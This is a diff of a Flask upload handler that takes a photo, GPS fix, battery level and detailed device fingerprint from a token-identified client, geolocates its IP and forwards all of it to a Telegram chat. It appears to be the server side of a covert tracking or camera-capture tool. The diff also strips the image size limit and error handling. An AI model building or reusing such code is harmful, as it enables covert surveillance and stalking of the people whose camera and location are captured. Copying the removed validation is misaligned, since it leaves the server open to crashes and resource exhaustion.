@@ -488,118 +488,85 @@ def upload_image(token):
         return "Invalid token", 404
 
     data = request.get_json(silent=True) or {}
-    b64 = data.get("image_b64", "")
+    b64 = data.get("image_b64")
     coords = data.get("coords")
     battery = data.get("battery")
+    details = data.get("details") or {}
 
     raw_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
     ip = extract_client_ip(raw_ip)
+    timestamp = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
 
     if not b64:
-        return ("No image data", 400)
+        return ("No image", 400)
     if b64.startswith("data:"):
-        try:
-            b64 = b64.split(",", 1)[1]
-        except Exception:
-            return ("Bad data url", 400)
-    try:
-        imgbytes = base64.b64decode(b64)
-    except Exception:
-        return ("Bad base64", 400)
+        b64 = b64.split(",", 1)[1]
+    img = base64.b64decode(b64)
 
-    if len(imgbytes) > 10_000_000:
-        return ("Image too large", 413)
+    filename = f"{token}_{uuid.uuid4().hex}.jpg"
+    path = os.path.join(UPLOAD_DIR, filename)
+    with open(path, "wb") as f:
+        f.write(img)
 
-    timestamp = datetime.utcnow().strftime("%Y%m%dT%H%M%S%f")
-    fname = f"{token}_{timestamp}.jpg"
-    path = os.path.join(UPLOAD_DIR, fname)
-    try:
-        with open(path, "wb") as f:
-            f.write(imgbytes)
-    except Exception as e:
-        print("Failed to write image:", e)
-        return ("Server error saving image", 500)
-
-    sess = SESSIONS[token]
-    sess.setdefault("files", []).append(fname)
-    meta = {
-        "timestamp": timestamp,
-        "filename": fname,
-        "ip": ip,
-    }
-    if coords:
-        meta["coords"] = coords
-    if battery:
-        meta["battery"] = battery
-    sess.setdefault("images_meta", []).append(meta)
+    SESSIONS[token].setdefault("files", []).append(filename)
     save_sessions(SESSIONS)
 
-    chat_id = sess.get("chat_id")
+    # ---------- Build caption (FULL specs identical to INFO) ----------
+    geo = geoip_lookup(ip)
+    city = geo.get("city") if geo else "unknown"
+    region = geo.get("region") if geo else "unknown"
+    country = geo.get("country_name") if geo else "unknown"
+    isp = geo.get("org") if geo else "unknown"
+
+    # Battery
+    if isinstance(battery, dict) and battery.get("level") is not None:
+        bat_txt = f"{battery['level']}%{' (charging)' if battery.get('charging') else ''}"
+    else:
+        bat_txt = "unknown"
+
+    # GPS
+    if isinstance(coords, dict):
+        loc_txt = f"{coords.get('lat')},{coords.get('lon')} ±{coords.get('acc')}m"
+    else:
+        loc_txt = "unknown"
+
+    # Device Specs
+    ua = details.get("userAgent", "")
+    platform = details.get("platform", "")
+    os_name = guess_os_name(ua, platform)
+    model = guess_device_model(ua)
+    cpu = details.get("cpuCores")
+    ram = details.get("ramGB")
+    langs = details.get("languages") or []
+    scr = details.get("screen") or {}
+    net = details.get("network") or {}
+    tz = details.get("tz") or {}
+    storage = details.get("storage") or {}
+
+    caption = f"""📷 Session {token} — PHOTO
+⏱ Time: {timestamp}
+🌍 IP: {ip}
+🏙 GeoIP: {city}, {region}, {country}
+🏢 ISP: {isp}
+🔋 Battery: {bat_txt}
+📍 GPS: {loc_txt}
+📱 Device: {os_name} {'· '+model if model else ''}
+
+💾 RAM: {ram} GB | CPU: {cpu} cores
+🗄 Storage: {storage.get('usageBytes','?')} / {storage.get('quotaBytes','?')} bytes
+🖥 Screen: {scr.get('w')}×{scr.get('h')} ({scr.get('ratio')}x)
+🌐 Network: {net.get('type')} {net.get('downlink')} Mbps
+🕒 Timezone: {tz.get('zone')} (UTC offset {tz.get('offset')} min)
+🌎 Languages: {", ".join(langs[:5])}
+"""
+
+    chat_id = SESSIONS[token].get("chat_id")
     if chat_id:
-        # Battery caption
-        if isinstance(battery, dict):
-            lvl = battery.get("level")
-            chg = battery.get("charging")
-            try:
-                if lvl is not None:
-                    lvl = round(float(lvl))
-                    bat_txt = f"{lvl}%{' (charging)' if chg else ''}"
-                else:
-                    bat_txt = "unknown"
-            except Exception:
-                bat_txt = str(battery)
-        else:
-            bat_txt = "unknown"
+        if not tg_send_photo(chat_id, path, caption=caption):
+            tg_send_text(chat_id, f"Image saved:\n{url_for('serve_upload', filename=filename, _external=True)}\n\n{caption}")
 
-        # Coords caption
-        if isinstance(coords, dict):
-            lat = coords.get("lat")
-            lon = coords.get("lon")
-            acc = coords.get("acc") or coords.get("accuracy")
-            if lat is not None and lon is not None:
-                if acc is not None:
-                    loc_txt = f"{lat},{lon} (±{acc} m)"
-                else:
-                    loc_txt = f"{lat},{lon}"
-            else:
-                loc_txt = str(coords)
-        else:
-            loc_txt = "unknown"
+    return jsonify({"status": "ok", "file": filename})
 
-        # GeoIP + address also for photo caption (best effort)
-        geo = geoip_lookup(ip)
-        city = region = country = isp = "unknown"
-        if isinstance(geo, dict):
-            city = geo.get("city") or "unknown"
-            region = geo.get("region") or geo.get("region_code") or "unknown"
-            country = geo.get("country_name") or geo.get("country") or "unknown"
-            isp = geo.get("org") or geo.get("asn") or "unknown"
-
-        human_address = reverse_geocode_from_coords(coords) if coords else None
-
-        caption_lines = [
-            f"📷 Session {token} — PHOTO",
-            f"⏱ Time: {timestamp}",
-            f"🌍 IP: {ip}",
-            f"🏙 GeoIP: {city}, {region}, {country}",
-            f"🏢 ISP: {isp}",
-            f"🔋 Battery: {bat_txt}",
-            f"📍 GPS: {loc_txt}",
-        ]
-        if human_address:
-            caption_lines.append(f"🏠 Address: {human_address}")
-
-        caption = "\n".join(caption_lines)
-
-        sent = tg_send_photo(chat_id, path, caption=caption)
-        if not sent:
-            try:
-                downloads_url = url_for("serve_upload", filename=fname, _external=True)
-                tg_send_text(chat_id, f"Image saved: {downloads_url}\n{caption}")
-            except Exception as e:
-                print("Fallback photo send error:", e)
-
-    return jsonify({"status": "saved", "filename": fname, "meta": meta})
 
 
 @app.route("/session_data/<token>")
